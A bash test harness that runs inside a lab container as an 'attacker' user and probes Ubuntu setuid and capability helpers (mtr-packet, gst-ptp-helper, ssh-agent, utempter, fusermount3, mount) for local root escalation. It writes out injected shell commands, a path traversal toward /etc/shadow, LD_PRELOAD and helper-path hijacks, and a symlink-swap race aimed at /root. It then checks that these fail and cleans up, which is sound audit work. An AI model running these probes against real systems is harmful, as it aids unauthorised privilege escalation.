#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'INNER'
set +e
export LC_ALL=C

section() {
  printf '\n===== %s =====\n' "$*"
}

run() {
  printf '+ %s\n' "$*"
  bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

multiarch="$(ls -d /usr/lib/*-linux-gnu 2>/dev/null | head -1 | xargs -r basename)"
[ -n "$multiarch" ] || multiarch="aarch64-linux-gnu"
GST_HELPER="/usr/lib/$multiarch/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
UTEMPTER="/usr/lib/$multiarch/utempter/utempter"
ROOT_BASE="/tmp/rhp-residual-helper-parser-root"
SRC_DIR="$ROOT_BASE/src"

cleanup() {
  for m in \
    /tmp/residual-helper-parser.fuse-normal \
    /tmp/residual-helper-parser.fuse-race/mnt \
    /tmp/residual-helper-parser.mount-ns \
    /tmp/residual-helper-parser.userns-mnt \
    /tmp/residual-helper-parser.mount-leaf \
    /tmp/residual-helper-parser.mount-mkdir/leaf
  do
    fusermount3 -u "$m" >/dev/null 2>&1 || umount "$m" >/dev/null 2>&1 || true
  done
  pkill -u attacker -f 'residual-helper-parser' >/dev/null 2>&1 || true
  if [ -e "$ROOT_BASE/run.utmp.bak" ]; then
    cp -a "$ROOT_BASE/run.utmp.bak" /run/utmp 2>/dev/null || true
  fi
  if [ -e "$ROOT_BASE/wtmp.bak" ]; then
    cp -a "$ROOT_BASE/wtmp.bak" /var/log/wtmp 2>/dev/null || true
  fi
  rm -rf /tmp/residual-helper-parser* /home/attacker/residual-helper-parser \
    "$ROOT_BASE" \
    /root/residual-helper-parser-agent-target \
    /root/residual-helper-parser-fuse-race-target
}

trap cleanup EXIT
cleanup
mkdir -p "$ROOT_BASE" "$SRC_DIR"
cp -a /run/utmp "$ROOT_BASE/run.utmp.bak" 2>/dev/null || true
cp -a /var/log/wtmp "$ROOT_BASE/wtmp.bak" 2>/dev/null || true

section "target and default helper proof"
run 'cat /etc/os-release | sed -n "1,8p"; uname -a; id attacker; groups attacker'
run 'dpkg-query -W -f='\''${binary:Package}\t${Version}\t${Architecture}\t${source:Package}\t${source:Version}\n'\'' mtr-tiny libgstreamer1.0-0 openssh-client libutempter0 fuse3 util-linux libmount1 2>&1'
run 'dpkg -V mtr-tiny libgstreamer1.0-0 openssh-client libutempter0 fuse3 util-linux 2>&1; echo dpkg_verify_rc=$?'
run "stat -c '%A %a %U:%G %n' /usr/bin/mtr-packet '$GST_HELPER' /usr/bin/ssh-agent '$UTEMPTER' /usr/bin/fusermount3 /usr/bin/mount /usr/bin/umount 2>&1"
run "getcap -v /usr/bin/mtr-packet '$GST_HELPER' /usr/bin/ssh-agent '$UTEMPTER' /usr/bin/fusermount3 /usr/bin/mount /usr/bin/umount 2>&1"
run 'find / -xdev \( -group _ssh -o -group utmp \) -printf "%m %u:%g %p\n" 2>/dev/null | sort'
run 'sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos kernel.unprivileged_userns_clone 2>&1'
run 'systemctl is-system-running 2>&1; systemctl --failed --no-legend 2>&1 || true'

section "best-effort source parser and trust-boundary grep"
fetch() {
  label="$1"
  url="$2"
  out="$3"
  printf '+ curl %s\n' "$label"
  curl -fsSL --connect-timeout 8 --max-time 45 "$url" -o "$out" 2>&1
  printf 'curl_rc=%s path=%s\n' "$?" "$out"
}

show_gz() {
  archive="$1"
  file="$2"
  pattern="$3"
  [ -r "$archive" ] || return 0
  printf -- '--- %s\n' "$file"
  tar -xOzf "$archive" "$file" 2>/dev/null | nl -ba | grep -E "$pattern" | sed -n '1,120p'
}

show_xz() {
  archive="$1"
  file="$2"
  pattern="$3"
  [ -r "$archive" ] || return 0
  printf -- '--- %s\n' "$file"
  tar -xOJf "$archive" "$file" 2>/dev/null | nl -ba | grep -E "$pattern" | sed -n '1,120p'
}

fetch mtr 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/mtr/0.95-1.1ubuntu0.1/mtr_0.95.orig.tar.gz' "$SRC_DIR/mtr.tgz"
show_gz "$SRC_DIR/mtr.tgz" mtr-0.95/packet/cmdparse.c 'parse_command|MAX_COMMAND|strtol|token|argument|exec|system|open'
show_gz "$SRC_DIR/mtr.tgz" mtr-0.95/packet/command.c 'check-support|send-probe|strtol|unknown-command|invalid-argument|SO_MARK|mark|protocol|size|ttl|timeout'
show_gz "$SRC_DIR/mtr.tgz" mtr-0.95/packet/probe_unix.c 'init_net_state_privileged|socket|setsockopt|sendto|SO_MARK|cap|privilege|raw|dgram|open|exec'

fetch gst 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/gstreamer1.0/1.24.2-1ubuntu0.1/gstreamer1.0_1.24.2.orig.tar.xz' "$SRC_DIR/gstreamer.tar.xz"
show_xz "$SRC_DIR/gstreamer.tar.xz" gstreamer-1.24.2/libs/gst/helpers/ptp/main.rs 'parse_args|list_interfaces|create_socket|join_multicast|drop|stdin|stdout|write_all|read|Command|spawn|open|File'
show_xz "$SRC_DIR/gstreamer.tar.xz" gstreamer-1.24.2/libs/gst/helpers/ptp/privileges.rs 'cap_|cap_clear|cap_set_proc|drop|setuid|setgid|seteuid|setegid'
show_xz "$SRC_DIR/gstreamer.tar.xz" gstreamer-1.24.2/libs/gst/helpers/ptp/net.rs 'socket|bind|setsockopt|SO_BIND|SO_REUSE|join_multicast|interface|ifindex|ioctl'

fetch openssh 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1%3A9.6p1-3ubuntu13.16/openssh_9.6p1.orig.tar.gz' "$SRC_DIR/openssh.tgz"
show_gz "$SRC_DIR/openssh.tgz" openssh-9.6p1/ssh-agent.c 'setegid|setgid|getgid|pkcs11|PKCS11|listener|bind|unlink|socket|exec|drop|SSH_PKCS11_HELPER'
show_gz "$SRC_DIR/openssh.tgz" openssh-9.6p1/ssh-pkcs11-client.c 'SSH_PKCS11_HELPER|exec|spawn|socketpair|helper|setgid|setuid'

fetch utempter 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/libutempter/1.2.1-3build1/libutempter_1.2.1.orig.tar.gz' "$SRC_DIR/libutempter.tgz"
show_gz "$SRC_DIR/libutempter.tgz" libutempter-1.2.1/utempter.c 'ptsname|DEV_PREFIX|getuid|st_uid|validate_hostname|isprint|pututline|updwtmp|argv|add|del|wtmp|utmp'
show_gz "$SRC_DIR/libutempter.tgz" libutempter-1.2.1/iface.c 'execv|setgid|utempter_add_record|utempter_remove_record|master_fd|helper'

fetch fuse3 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/fuse3/3.14.0-5build1/fuse3_3.14.0.orig.tar.xz' "$SRC_DIR/fuse3.tar.xz"
show_xz "$SRC_DIR/fuse3.tar.xz" fuse-3.14.0/util/fusermount.c 'FUSE_COMMFD|drop_privs|restore_privs|setfsuid|user_allow_other|mount_max|lstat|chdir|proc/self/fd|mount\(|umount|UMOUNT_NOFOLLOW|mtab|lock'

fetch util-linux 'https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/util-linux/2.39.3-9ubuntu6.5/util-linux_2.39.3.orig.tar.xz' "$SRC_DIR/util-linux.tar.xz"
show_xz "$SRC_DIR/util-linux.tar.xz" util-linux-2.39.3/sys-utils/mount.c 'suid_drop|drop_permissions|sanitize|restricted|namespace|setns|setuid|setgid'
show_xz "$SRC_DIR/util-linux.tar.xz" util-linux-2.39.3/sys-utils/umount.c 'suid_drop|drop_permissions|restricted|namespace|setns|setuid|setgid'
show_xz "$SRC_DIR/util-linux.tar.xz" util-linux-2.39.3/libmount/src/context_mount.c 'exec_helper|drop_permissions|execv|helper|restricted|mount\('
show_xz "$SRC_DIR/util-linux.tar.xz" util-linux-2.39.3/libmount/src/context_umount.c 'exec_helper|drop_permissions|execv|UMOUNT_NOFOLLOW|chdir|utab|uhelper|helper|restricted'
show_xz "$SRC_DIR/util-linux.tar.xz" util-linux-2.39.3/libmount/src/hook_mkdir.c 'X-mount.mkdir|x-mount.mkdir|restricted|mkdir|ul_mkdir_p'

section "attacker live parser, race, env, and namespace probes"
runuser -u attacker -- env GST_HELPER="$GST_HELPER" UTEMPTER="$UTEMPTER" bash -s <<'ATTACKER'
set +e
export LC_ALL=C
base=/tmp/residual-helper-parser
home=/home/attacker/residual-helper-parser
rm -rf "$base"* "$home"
mkdir -p "$home/bin" "$base.dir"

show_status() {
  pid="$1"
  grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' "/proc/$pid/status" 2>&1 || true
  getpcaps "$pid" 2>&1 || true
}

echo "## attacker baseline"
id
grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/self/status
echo "GST_HELPER=$GST_HELPER"
echo "UTEMPTER=$UTEMPTER"

echo "## mtr-packet retained cap_net_raw and line parser"
rm -f "$base.mtr.in" "$base.mtr.out" "$base.mtr.err"
mkfifo "$base.mtr.in"
/usr/bin/mtr-packet <"$base.mtr.in" >"$base.mtr.out" 2>"$base.mtr.err" &
mtr_pid=$!
exec 9>"$base.mtr.in"
sleep 0.3
echo "mtr_pid=$mtr_pid"
show_status "$mtr_pid"
{
  printf '1 check-support feature send-probe\n'
  printf '2 check-support feature mark\n'
  printf '3 send-probe ip-4 127.0.0.1 protocol icmp size 64 bit-pattern 0 timeout 1\n'
  printf '4 send-probe ip-4 127.0.0.1 protocol icmp mark 123 timeout 1\n'
  printf '5 send-probe ip-4 ../../etc/shadow protocol icmp timeout 1\n'
  printf '6 /bin/sh -c id\n'
  printf '7 send-probe ip-4 127.0.0.1 protocol tcp local-port 1 dest-port 80 timeout 1\n'
} >&9
sleep 1
exec 9>&-
wait "$mtr_pid"
echo "mtr_wait_rc=$?"
cat "$base.mtr.out" "$base.mtr.err" 2>/dev/null
LD_PRELOAD="$home/nope.so" MTR_OPTIONS="$home/config" timeout 3 /usr/bin/mtr-packet <<'EOF' >"$base.mtr-env.out" 2>"$base.mtr-env.err"
8 send-probe ip-4 127.0.0.1 protocol icmp timeout 1
EOF
echo "mtr_env_rc=$?"
cat "$base.mtr-env.out" "$base.mtr-env.err"
test ! -e "$home/config" && echo "mtr did not create/read attacker env config path marker"

echo "## gst-ptp-helper argv/env and stdin protocol after capability drop"
python3 - <<'PY'
import os, select, struct, subprocess, time
helper = os.environ["GST_HELPER"]

def status(pid):
    print("pid", pid)
    with open(f"/proc/{pid}/status", "r", encoding="utf-8") as f:
        for line in f:
            if line.startswith(("Uid:", "Gid:", "Groups:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:", "NoNewPrivs:", "Seccomp:")):
                print(line.strip())
    subprocess.run(["getpcaps", str(pid)], check=False)

cmd = [helper, "-i", "eth0", "--clock-id", "0x0102030405060708"]
p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
clock = p.stdout.read(11)
print("clock_frame_len", len(clock), "clock_hex", clock.hex())
time.sleep(0.2)
status(p.pid)
ptp = bytearray(44)
ptp[0] = 0x01
ptp[1] = 0x02
ptp[2:4] = (44).to_bytes(2, "big")
ptp[20:28] = bytes.fromhex("0102030405060708")
ptp[28:30] = (1).to_bytes(2, "big")
ptp[30:32] = (0x1234).to_bytes(2, "big")
ptp[32] = 1
body = bytes([0]) + (0).to_bytes(8, "big") + ptp
p.stdin.write(struct.pack(">HB", len(body), 0) + body)
p.stdin.flush()
ready, _, _ = select.select([p.stdout], [], [], 2)
ack = os.read(p.stdout.fileno(), 64) if ready else b""
print("ack_len", len(ack), "ack_hex", ack.hex())
p.stdin.close()
try:
    p.wait(timeout=2)
except subprocess.TimeoutExpired:
    p.kill()
    p.wait()
print("valid_rc", p.returncode)
print("valid_stderr_tail", p.stderr.read().decode("utf-8", "replace")[-300:].replace("\0", "?").replace("\n", "\\n"))

for label, argv, payload in [
    ("bad_interface", [helper, "-i", "../eth0", "--clock-id", "0x0102030405060708"], b""),
    ("bad_clock", [helper, "-i", "eth0", "--clock-id", "not-a-clock"], b""),
    ("oversize_stdin", [helper, "-i", "eth0", "--clock-id", "0x0102030405060708"], struct.pack(">HB", 65535, 0)),
]:
    env = os.environ.copy()
    env.update({
        "GST_PTP_HELPER": "/home/attacker/residual-helper-parser/fake-helper",
        "GST_PLUGIN_PATH": "/home/attacker/residual-helper-parser/plugins",
        "GST_DEBUG_FILE": "/home/attacker/residual-helper-parser/gst-debug-file",
        "LD_PRELOAD": "/home/attacker/residual-helper-parser/nope.so",
    })
    try:
        r = subprocess.run(argv, input=payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, timeout=4)
        print(label, "rc", r.returncode, "stdout_hex", r.stdout[:64].hex(), "stderr_tail", r.stderr.decode("utf-8", "replace")[-300:].replace("\0", "?").replace("\n", "\\n"))
    except subprocess.TimeoutExpired:
        print(label, "timeout")
PY
find "$home" -maxdepth 2 -type f -printf 'gst_env_file %m %u:%g %p\n' 2>/dev/null || true

echo "## ssh-agent setgid _ssh, socket paths, and retained helper exec"
cat > "$home/bin/pkcs11-helper" <<'EOF'
#!/bin/sh
{
  id
  grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):' /proc/self/status
  printf 'argv:'
  for a in "$@"; do printf ' <%s>' "$a"; done
  printf '\n'
} > /tmp/residual-helper-parser.pkcs11-helper
exit 1
EOF
chmod 755 "$home/bin/pkcs11-helper"
SSH_PKCS11_HELPER="$home/bin/pkcs11-helper" timeout 8 /usr/bin/ssh-agent -a "$base.agent.sock" sh -c '
  id
  grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):" /proc/self/status
  ls -ln "$SSH_AUTH_SOCK"
  ssh-add -s /usr/lib/'"$(basename "$(dirname "$(dirname "$UTEMPTER")")")"'/libc.so.6 </dev/null >/tmp/residual-helper-parser.sshadd.out 2>/tmp/residual-helper-parser.sshadd.err
  echo ssh_add_rc=$?
  cat /tmp/residual-helper-parser.sshadd.err
'
echo "ssh_agent_command_rc=$?"
cat /tmp/residual-helper-parser.pkcs11-helper 2>/dev/null || echo "no pkcs11 helper marker"
/usr/bin/ssh-agent -D -a "$base.agentD.sock" >"$base.agentD.out" 2>"$base.agentD.err" &
agent_pid=$!
sleep 0.3
echo "agentD_pid=$agent_pid"
show_status "$agent_pid"
ls -ln "$base.agentD.sock" 2>&1
kill "$agent_pid" 2>/dev/null
wait "$agent_pid" 2>/dev/null
ln -sf /root/residual-helper-parser-agent-target "$base.agent.link"
timeout 5 /usr/bin/ssh-agent -D -a "$base.agent.link" >"$base.agent-link.out" 2>"$base.agent-link.err"
echo "ssh_agent_symlink_rc=$?"
cat "$base.agent-link.err"
test ! -e /root/residual-helper-parser-agent-target && echo "no root socket target from ssh-agent symlink path"

echo "## utempter tty/utmp parser boundary"
printf x | "$UTEMPTER" add 'bad
host' >"$base.utempter-direct.out" 2>"$base.utempter-direct.err"
echo "utempter_direct_rc=$?"
cat "$base.utempter-direct.out" "$base.utempter-direct.err"
python3 - <<'PY'
import ctypes, os, pty, subprocess
lib = ctypes.CDLL("libutempter.so.0")
lib.utempter_add_record.argtypes = [ctypes.c_int, ctypes.c_char_p]
lib.utempter_remove_record.argtypes = [ctypes.c_int]
for host in [b"residual-helper-ok", b"../path-host", b"bad\nhost", b"A" * 300]:
    master, slave = pty.openpty()
    print("host", repr(host[:40]), "slave", os.ttyname(slave), "uid", os.getuid(), "gid", os.getgid(), "groups", os.getgroups())
    rc = lib.utempter_add_record(master, host)
    print("add_rc", rc)
    subprocess.run(["who"], check=False)
    rc2 = lib.utempter_remove_record(master)
    print("del_rc", rc2)
    os.close(master)
    os.close(slave)
PY
who | grep -F residual-helper || echo "no stale active residual-helper utmp record"

echo "## fusermount3 COMMFD, symlink, allow_other, and swap-race probes"
python3 - <<'PY'
import array, os, shutil, socket, subprocess, threading, time

def clean_path(path):
    subprocess.run(["fusermount3", "-u", path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        if os.path.islink(path) or os.path.isfile(path):
            os.unlink(path)
        elif os.path.isdir(path):
            os.rmdir(path)
    except OSError:
        pass

def commfd_mount(label, mnt, opts=None):
    parent, child = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    os.set_inheritable(child.fileno(), True)
    env = os.environ.copy()
    env["_FUSE_COMMFD"] = str(child.fileno())
    argv = ["/usr/bin/fusermount3"]
    if opts:
        argv += ["-o", opts]
    argv.append(mnt)
    p = subprocess.Popen(argv, pass_fds=(child.fileno(),), env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    child.close()
    parent.settimeout(1.5)
    got = []
    try:
        msg, anc, flags, addr = parent.recvmsg(1, socket.CMSG_LEN(array.array("i", [0]).itemsize))
        for level, typ, data in anc:
            if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
                fds = array.array("i")
                fds.frombytes(data[:fds.itemsize])
                got.extend(fds.tolist())
    except Exception as e:
        print(label, "recv_exc", repr(e))
    out, err = p.communicate(timeout=4)
    print(label, "rc", p.returncode, "got_fd", bool(got), "out", out.strip(), "err", err.strip())
    subprocess.run(["findmnt", "-n", mnt], check=False)
    for fd in got:
        os.close(fd)
    subprocess.run(["fusermount3", "-u", mnt], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

normal = "/tmp/residual-helper-parser.fuse-normal"
clean_path(normal)
os.makedirs(normal, exist_ok=True)
commfd_mount("normal", normal, "default_permissions")
clean_path(normal)

link = "/tmp/residual-helper-parser.fuse-link"
clean_path(link)
os.symlink("/root/residual-helper-parser-fuse-race-target", link)
commfd_mount("symlink_to_missing_root", link, None)
clean_path(link)

allow = "/tmp/residual-helper-parser.fuse-allow-other"
clean_path(allow)
os.makedirs(allow, exist_ok=True)
commfd_mount("allow_other", allow, "allow_other")
clean_path(allow)

race_dir = "/tmp/residual-helper-parser.fuse-race"
mnt = race_dir + "/mnt"
shutil.rmtree(race_dir, ignore_errors=True)
os.makedirs(mnt)
stop = False
def swapper():
    while not stop:
        try:
            if os.path.islink(mnt):
                os.unlink(mnt)
            elif os.path.isdir(mnt):
                os.rmdir(mnt)
        except OSError:
            pass
        try:
            os.symlink("/root/residual-helper-parser-fuse-race-target", mnt)
        except OSError:
            pass
        try:
            if os.path.islink(mnt):
                os.unlink(mnt)
            os.makedirs(mnt, exist_ok=True)
        except OSError:
            pass
t = threading.Thread(target=swapper)
t.start()
success = 0
for i in range(20):
    commfd_mount(f"race_{i}", mnt, "default_permissions")
    if subprocess.run(["findmnt", "-n", mnt], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
        success += 1
        subprocess.run(["fusermount3", "-u", mnt], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stop = True
t.join()
print("race_mount_successes_on_attacker_path", success)
print("root_race_target_exists", os.path.exists("/root/residual-helper-parser-fuse-race-target"))
shutil.rmtree(race_dir, ignore_errors=True)
PY

echo "## mount/umount helper, fstab parser, env, and namespace crossing"
cat > "$home/bin/rhphelper" <<'EOF'
#!/bin/sh
{
  id
  grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):' /proc/self/status
  printf 'argv:'
  for a in "$@"; do printf ' <%s>' "$a"; done
  printf '\n'
} > /tmp/residual-helper-parser.mount-helper
exit 23
EOF
chmod 755 "$home/bin/rhphelper"
mkdir -p "$base.mount-mnt"
PATH="$home/bin:$PATH" mount -t fuse.rhphelper none "$base.mount-mnt" >"$base.mount-helper.out" 2>"$base.mount-helper.err"
echo "mount_fuse_helper_rc=$?"
cat /tmp/residual-helper-parser.mount-helper 2>/dev/null || echo "no mount helper marker"
cat "$base.mount-helper.err"

cat > "$home/fstab" <<EOF
none $base.mount-leaf tmpfs user,x-mount.mkdir=0777,x-mount.owner=0,x-mount.group=0,x-mount.mode=4755 0 0
EOF
rm -rf "$base.mount-leaf" "$base.mount-mkdir"
mount -T "$home/fstab" "$base.mount-leaf" >"$base.mount-fstab.out" 2>"$base.mount-fstab.err"
echo "mount_T_fstab_rc=$?"
cat "$base.mount-fstab.err"
stat -c 'mount_leaf %A %U:%G %n' "$base.mount-leaf" 2>&1 || true
LIBMOUNT_FSTAB="$home/fstab" LIBMOUNT_MTAB="$home/mtab" mount "$base.mount-leaf" >"$base.mount-env.out" 2>"$base.mount-env.err"
echo "mount_env_rc=$?"
cat "$base.mount-env.err"
mkdir -p "$base.source"
mount --mkdir "$base.source" "$base.mount-mkdir/leaf" >"$base.mount-mkdir.out" 2>"$base.mount-mkdir.err"
echo "mount_mkdir_rc=$?"
cat "$base.mount-mkdir.err"
stat -c 'mount_mkdir %A %U:%G %n' "$base.mount-mkdir" "$base.mount-mkdir/leaf" 2>&1 || true
mount --mkdir "$base.source" /root/residual-helper-parser-mount-root/leaf >"$base.mount-root.out" 2>"$base.mount-root.err"
echo "mount_root_mkdir_rc=$?"
cat "$base.mount-root.err"
test ! -e /root/residual-helper-parser-mount-root && echo "no root mkdir from mount --mkdir"
mkdir -p "$base.mount-ns"
mount -N /proc/1/ns/mnt -t tmpfs none "$base.mount-ns" >"$base.mount-N.out" 2>"$base.mount-N.err"
echo "mount_N_proc1_rc=$?"
cat "$base.mount-N.err"
umount -N /proc/1/ns/mnt "$base.mount-ns" >"$base.umount-N.out" 2>"$base.umount-N.err"
echo "umount_N_proc1_rc=$?"
cat "$base.umount-N.err"
ln -sf / "$base.umount-link"
umount "$base.umount-link" >"$base.umount-link.out" 2>"$base.umount-link.err"
echo "umount_symlink_rc=$?"
cat "$base.umount-link.err"
mkdir -p /tmp/residual-helper-parser.userns-mnt
unshare -Urnm sh -c '
  echo userns_id; id
  grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)):" /proc/self/status
  mount -t tmpfs tmpfs /tmp/residual-helper-parser.userns-mnt
  echo userns_mount_rc=$?
  echo userns-root > /tmp/residual-helper-parser.userns-mnt/inside
  stat -c "inside_userns %A %u:%g %n" /tmp/residual-helper-parser.userns-mnt/inside
  findmnt -n /tmp/residual-helper-parser.userns-mnt
  umount /tmp/residual-helper-parser.userns-mnt
' >"$base.userns.out" 2>"$base.userns.err"
echo "userns_block_rc=$?"
cat "$base.userns.out" "$base.userns.err"
findmnt -n /tmp/residual-helper-parser.userns-mnt 2>&1 || echo "no userns mount visible outside"
test ! -e /tmp/residual-helper-parser.userns-mnt/inside && echo "userns tmpfs file not visible outside"

echo "## attacker root-proof checks before root cleanup"
for p in /root/residual-helper-parser-agent-target /root/residual-helper-parser-fuse-race-target /root/residual-helper-parser-mount-root; do
  if [ -e "$p" ]; then
    echo "UNEXPECTED_ROOT_PATH $p"
    ls -ld "$p"
  else
    echo "absent $p"
  fi
done
ATTACKER

section "cleanup and post-run verification"
cleanup
run 'test ! -e /root/residual-helper-parser-agent-target; echo root_agent_marker_absent_rc=$?'
run 'test ! -e /root/residual-helper-parser-fuse-race-target; echo root_fuse_marker_absent_rc=$?'
run 'test ! -e /root/residual-helper-parser-mount-root; echo root_mount_marker_absent_rc=$?'
run 'find /tmp /home/attacker -maxdepth 2 \( -name "residual-helper-parser*" \) -print 2>/dev/null'
run 'who | grep -F residual-helper || true'
run 'systemctl is-system-running 2>&1; systemctl --failed --no-legend 2>&1 || true'
INNER
